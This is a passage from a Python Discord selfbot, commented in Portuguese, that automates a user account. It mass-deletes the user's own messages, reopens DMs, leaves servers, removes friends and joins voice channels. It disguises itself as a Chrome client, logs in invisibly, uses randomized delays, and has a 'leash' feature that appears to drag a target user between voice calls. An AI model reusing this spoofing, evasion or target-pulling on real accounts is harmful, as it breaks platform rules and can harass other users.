                print(f"  [i] Indice atualizando... ({total_results} restante(s)) aguardando... ({empty_retries}/5)")
                offset = 0
                await asyncio.sleep(5.0)
                continue
            empty_retries = 0

            print(f"  [i] Search API: {total_results} mensagem(ns) restante(s) (offset={offset}, ignoradas={len(failed_ids)})")

            # Extrai hits que ainda nao foram processados
            hits = []
            for group in message_groups:
                for msg in group:
                    if msg.get("hit") and msg["author"]["id"] == self.user_id:
                        if msg["id"] not in failed_ids:
                            hits.append(msg)

            if not hits:
                # Todos os hits desta pagina ja estao em failed_ids ou nao ha hits
                no_progress_rounds += 1
                if no_progress_rounds >= 5:
                    break
                offset += 25
                await asyncio.sleep(get_delay_single("search"))
                continue

            deleted_this_round = 0
            skipped_this_round = 0

            for msg in hits:
                msg_type = msg.get("type", 0)
                if msg_type not in self.DELETABLE_MSG_TYPES:
                    failed_ids.add(msg["id"])
                    offset += 1  # msg do sistema permanece no resultado, avanAa offset
                    skipped_this_round += 1
                    type_names = {1: "Adicao", 2: "Remocao", 3: "Chamada", 7: "Entrada",
                                  8: "Boost", 9: "Boost T1", 10: "Boost T2", 11: "Boost T3"}
                    name = type_names.get(msg_type, f"type={msg_type}")
                    print(f"    Pulando msg sistema {msg['id']} ({name})")
                    continue

                success = await self._delete_message(channel_id, msg, total_deleted + 1)
                if success:
                    total_deleted += 1
                    deleted_this_round += 1
                else:
                    failed_ids.add(msg["id"])
                    offset += 1  # msg falhou mas permanece no resultado

                _dd = get_delay("delete_message")
                delay = random.uniform(_dd[0], _dd[1])
                await asyncio.sleep(delay)

            # Progresso = apagou algo OU pulou novas msgs do sistema
            if deleted_this_round > 0 or skipped_this_round > 0:
                no_progress_rounds = 0  # estamos avanAando, resetar contador
            else:
                no_progress_rounds += 1
                if no_progress_rounds >= 5:
                    print(f"  [!] Sem progresso em 5 rodadas, encerrando.")
                    break

            # Se todas as mensagens do total sAo msgs do sistema ignoradas, acabou
            if len(failed_ids) >= total_results:
                print(f"  [i]   Todas as {total_results} mensagem(ns) restantes sAo do sistema.")
                break

            # Espera o Indice de busca do Discord atualizar
            await asyncio.sleep(get_delay_single("search") + 3.0)

        return total_deleted

    # Limpar todas as DMs
    def _progress_file(self) -> str:
        """Retorna o path do arquivo de progresso especAfico desta conta."""
        uid = self.user_id or "unknown"
        return os.path.join(SCRIPT_DIR, f"clall_progress_{uid}.json")

    def _progress_backup_file(self) -> str:
        """Retorna o path do backup do progresso."""
        return f"{self._progress_file()}.bak"

    @staticmethod
    def _default_progress() -> dict:
        return {"opened_user_ids": [], "cleaned_channel_ids": [], "dm_channels": []}

    def _normalize_progress(self, progress: dict) -> dict:
        """Normaliza estrutura do progresso para evitar dados quebrados."""
        if not isinstance(progress, dict):
            return self._default_progress()

        def _clean_id_list(values):
            out = []
            seen = set()
            if isinstance(values, list):
                for v in values:
                    if v is None:
                        continue
                    sid = str(v).strip()
                    if not sid or sid in seen:
                        continue
                    seen.add(sid)
                    out.append(sid)
            return out

        dm_channels = []
        seen_channels = set()
        raw_channels = progress.get("dm_channels", [])
        if isinstance(raw_channels, list):
            for ch in raw_channels:
                if not isinstance(ch, dict):
                    continue
                cid = ch.get("id")
                if cid is None:
                    continue
                cid = str(cid).strip()
                if not cid or cid in seen_channels:
                    continue
                seen_channels.add(cid)
                name = str(ch.get("name") or "")
                recipient_ids = []
                seen_recipients = set()
                raw_recipients = ch.get("recipient_ids", [])
                if isinstance(raw_recipients, list):
                    for rid in raw_recipients:
                        sid = str(rid or "").strip()
                        if sid and sid not in seen_recipients:
                            recipient_ids.append(sid)
                            seen_recipients.add(sid)
                dm_channels.append({"id": cid, "name": name, "recipient_ids": recipient_ids})

        return {
            "opened_user_ids": _clean_id_list(progress.get("opened_user_ids", [])),
            "cleaned_channel_ids": _clean_id_list(progress.get("cleaned_channel_ids", [])),
            "dm_channels": dm_channels,
            "updated_at": datetime.utcnow().isoformat(timespec="seconds") + "Z",
        }

    def _load_progress(self) -> dict:
        """Carrega progresso anterior do arquivo (com fallback para backup)."""
        candidates = [self._progress_file(), self._progress_backup_file()]
        read_errors = []

        for path in candidates:
            if not os.path.exists(path):
                continue
            try:
                with open(path, "r", encoding="utf-8") as f:
                    raw = json.load(f)
                progress = self._normalize_progress(raw)
                if path.endswith(".bak"):
                    print("  [i] Checkpoint principal invalido. Usando backup.")
                return progress
            except Exception as e:
                read_errors.append((path, e))

        if read_errors:
            print("  [!] Nao foi possivel ler o checkpoint anterior (arquivo corrompido).")
        return self._default_progress()

    def _save_progress(self, progress: dict):
        """Salva progresso atual usando escrita ate mica + backup."""
        pf = self._progress_file()
        backup = self._progress_backup_file()
        tmp = f"{pf}.tmp"
        normalized = self._normalize_progress(progress)

        os.makedirs(os.path.dirname(pf), exist_ok=True)

        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(normalized, f, ensure_ascii=False, indent=2)
            f.flush()
            os.fsync(f.fileno())

        if os.path.exists(pf):
            try:
                shutil.copyfile(pf, backup)
            except Exception:
                pass

        try:
            os.replace(tmp, pf)
        finally:
            if os.path.exists(tmp):
                try:
                    os.remove(tmp)
                except Exception:
                    pass

    def _clear_progress(self):
        """Remove arquivo de progresso e backup."""
        for path in (self._progress_file(), self._progress_backup_file()):
            if os.path.exists(path):
                os.remove(path)

    def _clfull_progress_file(self) -> str:
        """Retorna o path do checkpoint do clfull para esta conta."""
        uid = self.user_id or "unknown"
        return os.path.join(SCRIPT_DIR, f"clfull_progress_{uid}.json")

    def _clfull_progress_backup_file(self) -> str:
        """Retorna o path do backup do checkpoint do clfull."""
        return f"{self._clfull_progress_file()}.bak"

    @staticmethod
    def _default_clfull_progress() -> dict:
        return {
            "index_signature": "",
            "cleaned_channel_ids": [],
            "grand_total_deleted": 0,
            "channels_with_messages": 0,
        }

    @staticmethod
    def _build_clfull_signature(channel_ids: list[str]) -> str:
        """Gera assinatura estavel do index.json para detectar mudanca no package."""
        raw = "|".join(sorted(str(cid) for cid in channel_ids))
        return hashlib.sha1(raw.encode("utf-8")).hexdigest()

    def _normalize_clfull_progress(self, progress: dict) -> dict:
        """Normaliza checkpoint do clfull para estrutura valida."""
        if not isinstance(progress, dict):
            return self._default_clfull_progress()

        cleaned = []
        seen = set()
        raw_cleaned = progress.get("cleaned_channel_ids", [])
        if isinstance(raw_cleaned, list):
            for cid in raw_cleaned:
                if cid is None:
                    continue
                sid = str(cid).strip()
                if not sid or sid in seen:
                    continue
                seen.add(sid)
                cleaned.append(sid)

        def _safe_int(value, default=0):
            try:
                iv = int(value)
                return iv if iv >= 0 else default
            except Exception:
                return default

        sig = str(progress.get("index_signature") or "").strip()

        return {
            "index_signature": sig,
            "cleaned_channel_ids": cleaned,
            "grand_total_deleted": _safe_int(progress.get("grand_total_deleted", 0), 0),
            "channels_with_messages": _safe_int(progress.get("channels_with_messages", 0), 0),
            "updated_at": datetime.utcnow().isoformat(timespec="seconds") + "Z",
        }

    def _load_clfull_progress(self) -> dict:
        """Carrega checkpoint do clfull (com fallback para backup)."""
        candidates = [self._clfull_progress_file(), self._clfull_progress_backup_file()]
        read_errors = []

        for path in candidates:
            if not os.path.exists(path):
                continue
            try:
                with open(path, "r", encoding="utf-8") as f:
                    raw = json.load(f)
                progress = self._normalize_clfull_progress(raw)
                if path.endswith(".bak"):
                    print("  [i] Checkpoint clfull principal invalido. Usando backup.")
                return progress
            except Exception as e:
                read_errors.append((path, e))

        if read_errors:
            print("  [!] Nao foi possivel ler checkpoint do clfull (arquivo corrompido).")
        return self._default_clfull_progress()

    def _save_clfull_progress(self, progress: dict):
        """Salva checkpoint do clfull usando escrita ate mica + backup."""
        pf = self._clfull_progress_file()
        backup = self._clfull_progress_backup_file()
        tmp = f"{pf}.tmp"
        normalized = self._normalize_clfull_progress(progress)

        os.makedirs(os.path.dirname(pf), exist_ok=True)

        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(normalized, f, ensure_ascii=False, indent=2)
            f.flush()
            os.fsync(f.fileno())

        if os.path.exists(pf):
            try:
                shutil.copyfile(pf, backup)
            except Exception:
                pass

        try:
            os.replace(tmp, pf)
        finally:
            if os.path.exists(tmp):
                try:
                    os.remove(tmp)
                except Exception:
                    pass

    def _clear_clfull_progress(self):
        """Limpa checkpoint do clfull e backup."""
        for path in (self._clfull_progress_file(), self._clfull_progress_backup_file()):
            if os.path.exists(path):
                os.remove(path)

    async def purge_all_dms(self, excluded_user_ids: set[str] | None = None):
        """Apaga suas mensagens em todas as DMs (abertas + reabertas via relacionamentos). Continua de onde parou."""
        excluded_user_ids = self._normalize_id_set(excluded_user_ids)
        progress = self._load_progress()
        opened_user_ids = set(progress.get("opened_user_ids", []))
        cleaned_channel_ids = set(progress.get("cleaned_channel_ids", []))
        all_dm_channels = progress.get("dm_channels", [])
        seen_channel_ids = {ch["id"] for ch in all_dm_channels}

        resuming = len(all_dm_channels) > 0
        if resuming:
            remaining = [ch for ch in all_dm_channels if ch["id"] not in cleaned_channel_ids]
            print(f"\n[i] Retomando progresso anterior!")
            print(f"  [i] {len(all_dm_channels)} DM(s) mapeadas, {len(cleaned_channel_ids)} ja limpas, {len(remaining)} restantes.")
        else:
            print("\n[i]  Buscando DMs abertas...")
        if excluded_user_ids:
            print(f"  [i] Mantendo chats com usuario(s): {format_ids(excluded_user_ids)}")

        # 1) Busca DMs ja abertas (sempre faz para pegar novas)
        open_channels = await self.api_get("/users/@me/channels")
        if open_channels is None:
            open_channels = []

        new_open = 0
        skipped_open = 0
        for ch in open_channels:
            if ch.get("type") in (1, 3) and ch["id"] not in seen_channel_ids:
                skip, matched_ids = await self._channel_matches_excluded_user(ch, excluded_user_ids)
                if skip:
                    skipped_open += 1
                    entry = self._dm_channel_entry(ch)
                    print(f"  [i] Mantendo sem limpar: {entry['name']} ({format_ids(matched_ids)})")
                    continue

                seen_channel_ids.add(ch["id"])
                all_dm_channels.append(self._dm_channel_entry(ch))
                new_open += 1

        if new_open > 0:
            print(f"  [ok] {new_open} DM(s) abertas novas encontradas.")
        if skipped_open > 0:
            print(f"  [i] {skipped_open} chat(s) aberto(s) ignorado(s) por excecao.")

        # 2) Busca relacionamentos e reabre DMs fechadas (pula os ja abertos)
        print("[i] Buscando relacionamentos para reabrir DMs fechadas...")
        relationships = await self.api_get("/users/@me/relationships")
        if relationships is None:
            relationships = []

        reopened = 0
        for rel in relationships:
            user_id = rel.get("id")
            if not user_id:
                continue

            if user_id in excluded_user_ids:
                user_info = rel.get("user", {})
                username = user_info.get("username", "")
                display = user_info.get("global_name") or username or user_id
                print(f"  [i] Mantendo sem reabrir/limpar: {display} ({user_id})")
                continue

            # Pula quem ja foi processado antes
            if user_id in opened_user_ids:
                continue

            user_info = rel.get("user", {})
            username = user_info.get("username", "")
            display = user_info.get("global_name") or username

            # Tenta abrir/reabrir a DM
            result = await self.api_post("/users/@me/channels", {"recipients": [user_id]})

            # Marca como processado independente do resultado
            opened_user_ids.add(user_id)

            if result and result.get("id") not in seen_channel_ids:
                seen_channel_ids.add(result["id"])
                all_dm_channels.append(self._dm_channel_entry(result, display))
                reopened += 1
                print(f"  [i] Reaberta DM com: {display} (@{username})")

            # Salva progresso a cada abertura
            progress["opened_user_ids"] = list(opened_user_ids)
            progress["dm_channels"] = all_dm_channels
            self._save_progress(progress)

            await asyncio.sleep(random.uniform(1.5, 3.0))

        if reopened > 0:
            print(f"  [ok] {reopened} DM(s) reabertas via relacionamentos.")
        else:
            print(f"  [i]  Nenhuma DM nova para reabrir.")

        # Salva lista completa de canais
        progress["dm_channels"] = all_dm_channels
        progress["opened_user_ids"] = list(opened_user_ids)
        self._save_progress(progress)

        total_dms = len(all_dm_channels)
        pending = []
        skipped_pending = 0
        for ch in all_dm_channels:
            if ch["id"] in cleaned_channel_ids:
                continue
            skip, matched_ids = await self._channel_matches_excluded_user(ch, excluded_user_ids)
            if skip:
                skipped_pending += 1
                print(f"  [i] Pulando DM por excecao: {ch.get('name', '')} ({format_ids(matched_ids)})")
                continue
            pending.append(ch)

        if len(pending) == 0:
            if skipped_pending:
                print("  [i] Nenhuma DM restante depois das excecoes. Progresso mantido.")
            else:
                print("  [ok] Todas as DMs ja foram limpas! Resetando progresso.")
                self._clear_progress()
            return

        print(f"\n[i] Total: {total_dms} DM(s) | Restantes: {len(pending)} | JA limpas: {len(cleaned_channel_ids)}")
        if skipped_pending:
            print(f"  [i] Ignoradas por excecao: {skipped_pending}")
        grand_total = 0

        for i, ch in enumerate(pending, 1):
            print(f"\n[i] [{i}/{len(pending)}] Limpando DM: {ch['name']} ({ch['id']})")
            deleted = await self.purge_my_messages(ch["id"])
            grand_total += deleted

            # Marca como limpo e salva
            cleaned_channel_ids.add(ch["id"])
            progress["cleaned_channel_ids"] = list(cleaned_channel_ids)
            self._save_progress(progress)

            # Delay entre DMs
            await asyncio.sleep(random.uniform(1.0, 2.0))

        print(f"\n[ok] Limpeza geral concluida! {grand_total} mensagem(ns) apagada(s) em {len(pending)} DM(s).")
        if skipped_pending:
            print(f"  [i] Checkpoint mantido para preservar as DMs ignoradas.\n")
        else:
            print(f"  [ok]  Progresso resetado.\n")
            self._clear_progress()

    # Limpar via Discord Data Package (clfull)
    async def purge_open_dms_only(self, excluded_user_ids: set[str] | None = None):
        """Apaga suas mensagens somente nas DMs/grupos que ja estao abertos."""
        excluded_user_ids = self._normalize_id_set(excluded_user_ids)
        print("\n[i] Buscando apenas DMs abertas...")
        if excluded_user_ids:
            print(f"  [i] Mantendo chats com usuario(s): {format_ids(excluded_user_ids)}")
        open_channels = await self.api_get("/users/@me/channels")
        if open_channels is None:
            open_channels = []

        dm_channels = []
        seen_ids = set()
        skipped = 0

        for ch in open_channels:
            if ch.get("type") not in (1, 3):
                continue

            ch_id = ch.get("id")
            if not ch_id or ch_id in seen_ids:
                continue
            seen_ids.add(ch_id)

            entry = self._dm_channel_entry(ch)
            skip, matched_ids = await self._channel_matches_excluded_user(ch, excluded_user_ids)
            if skip:
                skipped += 1
                print(f"  [i] Mantendo sem limpar: {entry['name']} ({format_ids(matched_ids)})")
                continue

            dm_channels.append(entry)

        total = len(dm_channels)
        if total == 0:
            if skipped:
                print(f"  [i] Nenhum chat restante depois das excecoes ({skipped} mantido(s)).")
                return
            print("  [i] Nenhuma DM/grupo aberto encontrado.")
            return

        print(f"  [i] Encontrados {total} chat(s) aberto(s). Iniciando limpeza...\n")
        if skipped:
            print(f"  [i] Ignorados por excecao: {skipped}\n")

        grand_total = 0
        for i, ch in enumerate(dm_channels, 1):
            print(f"[i] [{i}/{total}] Limpando: {ch['name']} ({ch['id']})")
            deleted = await self.purge_my_messages(ch["id"])
            grand_total += deleted
            await asyncio.sleep(random.uniform(1.0, 2.0))

        print(f"\n[ok] cldms concluido! {grand_total} mensagem(ns) apagada(s) em {total} chat(s).\n")

    async def purge_from_data_package(self, excluded_user_ids: set[str] | None = None):
        """Apaga suas mensagens em TODOS os canais listados no Discord Data Package."""
        excluded_user_ids = self._normalize_id_set(excluded_user_ids)

        # Verifica se o index.json existe
        if not os.path.exists(DATA_PACKAGE_INDEX):
            print(f"  [!] Arquivo nao encontrado: {DATA_PACKAGE_INDEX}")
            print(f"  [i]  Como usar:")
            print(f"     1. Va em Discord > Config > Privacidade > Solicitar Todos os Meus Dados")
            print(f"     2. Baixe e extraia o ZIP")
            print(f"     3. Copie a pasta extraida para: package/ (ao lado do selfbot.py)")
            print(f"     4. O arquivo deve ficar em: package/messages/index.json")
            return

        # Le o index.json
        try:
            with open(DATA_PACKAGE_INDEX, "r", encoding="utf-8") as f:
                index_data = json.load(f)
        except Exception as e:
            print(f"  [!] Erro ao ler index.json: {e}")
            return

        # index.json e um dict: { "channel_id": "nome ou null", ... }
        channel_ids = list(index_data.keys())
        total = len(channel_ids)

        if total == 0:
            print("  [i]  Nenhum canal encontrado no index.json.")
            return

        signature = self._build_clfull_signature(channel_ids)
        progress = self._load_clfull_progress()

        # Se o package mudou (lista de canais diferente), reinicia o checkpoint
        if progress.get("index_signature") != signature:
            if progress.get("cleaned_channel_ids"):
                print("  [i] Index do package mudou. Reiniciando checkpoint do clfull.")
            progress = self._default_clfull_progress()
            progress["index_signature"] = signature
            self._save_clfull_progress(progress)

        cleaned_channel_ids = set(progress.get("cleaned_channel_ids", []))
        grand_total = int(progress.get("grand_total_deleted", 0))
        canais_com_msgs = int(progress.get("channels_with_messages", 0))
        pending_ids = [cid for cid in channel_ids if cid not in cleaned_channel_ids]
        remaining = len(pending_ids)

        print(f"\n[i] Discord Data Package carregado!")
        print(f"  [i] Arquivo: {DATA_PACKAGE_INDEX}")
        print(f"  [i] {total} canal(is) encontrado(s).")
        print(f"  [i] Ja concluidos: {len(cleaned_channel_ids)} | Restantes: {remaining}")
        if excluded_user_ids:
            print(f"  [i] Mantendo DMs/grupos com usuario(s): {format_ids(excluded_user_ids)}")
        if remaining < total:
            print(f"  [i] Retomando progresso anterior do clfull...")
        print()

        if remaining == 0:
            print("  [ok] Todos os canais do package ja foram processados.")
            print("  [i] Limpando checkpoint do clfull.")
            self._clear_clfull_progress()
            return

        order_map = {cid: idx + 1 for idx, cid in enumerate(channel_ids)}
        skipped_by_exclusion = 0

        for _, ch_id in enumerate(pending_ids, 1):
            ch_name = index_data[ch_id] or f"Canal {ch_id}"
            current_pos = order_map.get(ch_id, 0)
            if excluded_user_ids:
                channel_info = await self.api_get_channel(ch_id)
                if channel_info:
                    skip, matched_ids = await self._channel_matches_excluded_user(channel_info, excluded_user_ids)
                    if skip:
                        skipped_by_exclusion += 1
                        print(f"\n[i] [{current_pos}/{total}] Mantido por excecao: {ch_name} ({format_ids(matched_ids)})")
                        continue

            print(f"\n[i] [{current_pos}/{total}] Limpando: {ch_name} ({ch_id})")

            deleted = await self.purge_my_messages(ch_id)
            grand_total += deleted
            if deleted > 0:
                canais_com_msgs += 1

            # Marca o canal como processado e salva checkpoint
            cleaned_channel_ids.add(ch_id)
            progress["index_signature"] = signature
            progress["cleaned_channel_ids"] = list(cleaned_channel_ids)
            progress["grand_total_deleted"] = grand_total
            progress["channels_with_messages"] = canais_com_msgs
            self._save_clfull_progress(progress)

            # Delay entre canais
            await asyncio.sleep(random.uniform(1.0, 2.0))

        print(f"\n[ok] Limpeza FULL concluida!")
        print(f"  [ok]  {grand_total} mensagem(ns) apagada(s)")
        print(f"  [i] {canais_com_msgs}/{total} canal(is) tinham mensagens suas\n")
        if skipped_by_exclusion:
            print(f"  [i] Canal(is) mantido(s) por excecao: {skipped_by_exclusion}\n")
            print(f"  [i] Checkpoint mantido para preservar os canais ignorados.\n")
        else:
            self._clear_clfull_progress()

    # Gateway / WebSocket
    async def heartbeat(self):
        """Envia heartbeat periodicamente para manter a conexao."""
        while self.running:
            await asyncio.sleep(self.heartbeat_interval)
            if self.ws and not self.ws.closed:
                payload = {"op": 1, "d": self.sequence}
                await self.ws.send_json(payload)

    async def identify(self):
        """Envia o payload IDENTIFY para autenticar no gateway."""
        payload = {
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 16381,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                                          "Chrome/124.0.0.0 Safari/537.36",
                    "browser_version": "124.0.0.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "system_locale": "pt-BR",
                },
                "presence": {
                    "status": "invisible",
                    "since": 0,
                    "activities": [],
                    "afk": False,
                },
                "guild_subscriptions": True,
                "compress": False,
            },
        }
        await self.ws.send_json(payload)

    async def on_message(self, data: dict):
        """Processa evento MESSAGE_CREATE."""
        author_id = data["author"]["id"]
        content = data.get("content", "").strip()
        channel_id = data["channel_id"]

        # So reage a mensagens do proprio usuario
        if author_id != self.user_id:
            return

        content_lower = content.lower()

        # ml!cl -> Limpar mensagens
        if content_lower == COMMAND_PREFIX:
            print(f"[i] Comando ml!cl detectado no canal {channel_id}!")

            # Primeiro apaga a mensagem do comando
            await self.api_delete(f"/channels/{channel_id}/messages/{data['id']}")
            await asyncio.sleep(random.uniform(0.3, 0.7))

            # Depois limpa as mensagens
            await self.purge_my_messages(channel_id)

        # ml!clall -> Limpar TODAS as DMs
        elif content_lower == CLALL_PREFIX:
            print(f"[i] Comando ml!clall detectado!")

            # Apaga a mensagem do comando
            await self.api_delete(f"/channels/{channel_id}/messages/{data['id']}")
            await asyncio.sleep(random.uniform(0.3, 0.7))

            await self.purge_all_dms()

        elif content_lower == CLDMS_PREFIX:
            print(f"[i] Comando ml!cldms detectado!")

            # Apaga a mensagem do comando
            await self.api_delete(f"/channels/{channel_id}/messages/{data['id']}")
            await asyncio.sleep(random.uniform(0.3, 0.7))

            try:
                await self.purge_open_dms_only()
            except Exception as e:
                print(f"  [warn] cldms interrompido por erro inesperado: {e}")
        # ml!clfull -> Limpar via Discord Data Package
        elif content_lower == CLFULL_PREFIX:
            print(f"[i] Comando ml!clfull detectado!")

            # Apaga a mensagem do comando
            await self.api_delete(f"/channels/{channel_id}/messages/{data['id']}")
            await asyncio.sleep(random.uniform(0.3, 0.7))

            try:
                await self.purge_from_data_package()
            except Exception as e:
                print(f"  [warn] clfull interrompido por erro inesperado: {e}")

        # ml!farmcall -> Entrar/sair de canal de voz
        elif content_lower.startswith(FARMCALL_PREFIX.lower()):
            # Apaga a mensagem do comando
            await self.api_delete(f"/channels/{channel_id}/messages/{data['id']}")
            await asyncio.sleep(random.uniform(0.3, 0.7))

            args = content[len(FARMCALL_PREFIX):].strip().split()

            # ml!farmcall leave -> sair do canal de voz
            if len(args) >= 1 and args[0].lower() == "leave":
                print(f"[i] Comando ml!farmcall leave detectado!")
                await self.leave_voice_channel()
                return

            if len(args) < 1:
                print("  [!] Uso: ml!farmcall <id_do_canal> [mute|deafen]")
                return

            voice_channel_id = args[0]
            mode = args[1].lower() if len(args) >= 2 else ""

            self_mute = mode in ("mute", "deafen")
            self_deaf = mode == "deafen"

            mode_text = "deafen" if self_deaf else ("mute" if self_mute else "normal")
            print(f"[i] Comando ml!farmcall detectado! Canal: {voice_channel_id} | Modo: {mode_text}")

            await self.join_voice_channel(voice_channel_id, self_mute=self_mute, self_deaf=self_deaf)

        # ml!quitservers -> Sair de todos os servidores
        elif content_lower == QUITSERVERS_PREFIX.lower():
            print(f"[i] Comando ml!quitservers detectado!")

            # Apaga a mensagem do comando
            await self.api_delete(f"/channels/{channel_id}/messages/{data['id']}")
            await asyncio.sleep(random.uniform(0.3, 0.7))

            await self.quit_all_servers()

        # ml!removefriends -> Remover todos os amigos
        elif content_lower == REMOVEFRIENDS_PREFIX.lower():
            print(f"[i] Comando ml!removefriends detectado!")

            # Apaga a mensagem do comando
            await self.api_delete(f"/channels/{channel_id}/messages/{data['id']}")
            await asyncio.sleep(random.uniform(0.3, 0.7))

            await self.remove_all_friends()

    async def listen(self):
        """Loop principal que escuta eventos do WebSocket."""
        async with aiohttp.ClientSession() as self.session:
            async with self.session.ws_connect(
                GATEWAY_URL,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                                  "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    "Origin": "https://discord.com",
                },
                max_msg_size=0,  # sem limite de tamanho
            ) as self.ws:
                self._zlib_buffer = bytearray()
                self._inflator = zlib.decompressobj()

                async for msg in self.ws:
                    # Descompressao zlib-stream (BINARY)
                    if msg.type == aiohttp.WSMsgType.BINARY:
                        self._zlib_buffer.extend(msg.data)
                        if len(msg.data) < 4 or msg.data[-4:] != b'\x00\x00\xff\xff':
                            continue
                        try:
                            raw = self._inflator.decompress(self._zlib_buffer)
                            self._zlib_buffer = bytearray()
                        except Exception as e:
                            print(f"  [!] Erro ao descomprimir: {e}")
                            self._zlib_buffer = bytearray()
                            self._inflator = zlib.decompressobj()
                            continue
                        payload = json.loads(raw.decode('utf-8'))
                    elif msg.type == aiohttp.WSMsgType.TEXT:
                        payload = json.loads(msg.data)
                    elif msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                        close_code = self.ws.close_code
                        print(f"[!] ConexAo com o Gateway encerrada (code={close_code}).")
                        if close_code == 4004:
                            print(f"{self._tag()} [ok] Token invalido! Desativando reconexao.")
                            self.running = False
                        break
                    else:
                        continue

                    # Processamento comum (BINARY ou TEXT)
                    op = payload.get("op")
                    event = payload.get("t")
                    data = payload.get("d")

                    if payload.get("s"):
                        self.sequence = payload["s"]

                    # Opcode 10 -> Hello (define heartbeat interval)
                    if op == 10:
                        self.heartbeat_interval = data["heartbeat_interval"] / 1000
                        asyncio.create_task(self.heartbeat())
                        await self.identify()

                    # Opcode 11 -> Heartbeat ACK
                    elif op == 11:
                        pass

                    # READY
                    elif event == "READY":
                        self.user_id = data["user"]["id"]
                        self.username = data["user"]["username"]
                        if not self.label:
                            self.label = self.username
                        self.guilds = data.get("guilds", [])
                        # Salva o username no config.json
                        update_username_in_config(self.token, self.username)
                        # Cacheia voice states das guilds
                        vc_count = 0
                        for guild in data.get("guilds", []):
                            gid = guild.get("id")
                            for vs in guild.get("voice_states", []):
                                ch_id = vs.get("channel_id")
                                uid = vs.get("user_id")
                                if ch_id and uid:
                                    if uid == self.user_id:
                                        self.voice_channel_id = ch_id
                                        self.voice_guild_id = gid
                                    if ch_id not in self._voice_members_cache:
                                        self._voice_members_cache[ch_id] = []
                                    self._voice_members_cache[ch_id].append({
                                        "user_id": uid,
                                        "channel_id": ch_id,
                                        "guild_id": gid,
                                    })
                                    vc_count += 1
                        if vc_count:
                            print(f"  {self._tag()} \033[36m\U0001f50a {vc_count} membro(s) em voice cache (READY)\033[0m")
                        # Sinaliza que reconectou com sucesso
                        self._connected_event.set()

                    # GUILD_CREATE -> cacheia voice_states de guilds que chegam depois do READY
                    elif event == "GUILD_CREATE":
                        gid = data.get("id")
                        if gid and not any(g.get("id") == gid for g in self.guilds if isinstance(g, dict)):
                            self.guilds.append(data)
                        for vs in data.get("voice_states", []):
                            ch_id = vs.get("channel_id")
                            uid = vs.get("user_id")
                            if ch_id and uid:
                                if uid == self.user_id:
                                    self.voice_channel_id = ch_id
                                    self.voice_guild_id = gid
                                if ch_id not in self._voice_members_cache:
                                    self._voice_members_cache[ch_id] = []
                                # Evita duplicatas
                                if not any(m["user_id"] == uid for m in self._voice_members_cache[ch_id]):
                                    self._voice_members_cache[ch_id].append({
                                        "user_id": uid,
                                        "channel_id": ch_id,
                                        "guild_id": gid,
                                    })

                    # MESSAGE_CREATE
                    elif event == "MESSAGE_CREATE":
                        asyncio.create_task(self.on_message(data))

                    # VOICE_STATE_UPDATE -> para coleira e cache de membros
                    elif event == "VOICE_STATE_UPDATE":
                        vs_user_id = data.get("user_id")
                        vs_channel_id = data.get("channel_id")
                        vs_guild_id = data.get("guild_id")

                        # Atualiza cache de voice members
                        # Remove o user de todos os canais cacheados
                        for ch_id in list(self._voice_members_cache.keys()):
                            self._voice_members_cache[ch_id] = [
                                m for m in self._voice_members_cache[ch_id]
                                if m.get("user_id") != vs_user_id
                            ]
                        # Adiciona ao novo canal se conectou
                        if vs_channel_id:
                            if vs_channel_id not in self._voice_members_cache:
                                self._voice_members_cache[vs_channel_id] = []
                            self._voice_members_cache[vs_channel_id].append({
                                "user_id": vs_user_id,
                                "channel_id": vs_channel_id,
                                "guild_id": vs_guild_id,
                            })

                        if vs_user_id == self.user_id:
                            self.voice_channel_id = vs_channel_id
                            self.voice_guild_id = vs_guild_id if vs_channel_id else None
                            if self._leash_running:
                                if vs_channel_id and vs_guild_id:
                                    print(f"  {c.Y}[coleira]{c.X} Sua call mudou para {vs_channel_id}.")
                                else:
                                    print(f"  {c.Y}[coleira]{c.X} Voce saiu da call. Aguardando entrar em outra.")

                        # Coleira: se EU mudei de canal, puxar o alvo
                        if (self._leash_running and self._leash_target
                                and vs_user_id == self.user_id
                                and vs_channel_id and vs_guild_id):
                            asyncio.create_task(self._leash_follow(vs_channel_id, vs_guild_id))

                    # GUILD_MEMBER_LIST_UPDATE -> popular cache de voice members via op 14
                    elif event == "GUILD_MEMBER_LIST_UPDATE":
                        list_guild_id = data.get("guild_id")
                        # Parseia membros de qualquer resposta de member list
                        target_ch = self._voice_request_channel
                        if target_ch and list_guild_id:
                            found_members = []
                            for op_item in data.get("ops", []):
                                for item in op_item.get("items", []):
                                    member = item.get("member")
                                    if member:
                                        uid = member.get("user", {}).get("id")
                                        if uid:
                                            found_members.append({
                                                "user_id": uid,
                                                "channel_id": target_ch,
                                                "guild_id": list_guild_id,
                                            })
                            self._voice_members_cache[target_ch] = found_members
                        # Sinaliza que a resposta chegou
                        if self._voice_request_event and not self._voice_request_event.is_set():
                            self._voice_request_event.set()

    async def handle_terminal_command(self, line: str):
        """Processa um comando digitado no terminal."""
        line = line.strip()
        if not line:
            return

        parts = line.split()
        cmd = parts[0].lower()

        if cmd in ("help", ""):
            print()
            print("-" * 55)
            print("  [i] Comandos do Terminal:")
            print("-" * 55)
            print("  cl <canal_ou_user_id>        -> apaga suas msgs no canal/DM")
            print("  clall                        -> apaga suas msgs em TODAS as DMs")
            print("  cldms                        -> apaga suas msgs apenas nas DMs abertas")
            print("  clfull                       -> apaga msgs via Data Package")
            print("  farmcall <canal_id> [modo]   -> entra no canal de voz")
            print("  farmcall leave               -> sai do canal de voz")
            print("  quitservers                  -> sai de todos os servidores")
            print("  removefriends                -> remove todos os amigos")
            print("-" * 55)
            print()
            return

        # Verifica se esta logado
        if not self.user_id or not self.session:
            print("  [!] Bot ainda nao esta conectado. Aguarde o login.")
            return

        if cmd == "cl":
            if len(parts) < 2:
